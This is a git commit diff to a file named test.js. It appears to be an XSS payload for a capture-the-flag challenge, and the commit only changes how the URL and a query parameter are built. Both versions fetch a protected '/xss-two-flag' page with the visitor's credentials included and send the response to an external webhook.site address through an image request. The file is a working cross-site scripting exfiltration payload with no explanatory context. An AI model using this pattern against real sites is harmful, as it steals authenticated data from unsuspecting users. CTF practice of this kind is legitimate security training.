2c954a03a548f01c487f2951cd10d242da9f9993
Un1ike <130181025+Un1ike@users.noreply.github.com>
2026-03-22 02:43:21 -1000

    Update test.js

--- test.js
+++ test.js
@@ -1,5 +1,5 @@
-fetch('/xss-two-flag', { credentials: 'include' })
+fetch(window.location.origin + '/xss-two-flag', { credentials: 'include' })
   .then(r => r.text())
   .then(flag => {
-    new Image().src = 'https://webhook.site/df3cbd5e-ca31-4457-b8ff-ac4735fe041c?d=' + encodeURIComponent(flag);
+    new Image().src = 'https://webhook.site/df3cbd5e-ca31-4457-b8ff-ac4735fe041c?flag=' + encodeURIComponent(flag);
   });
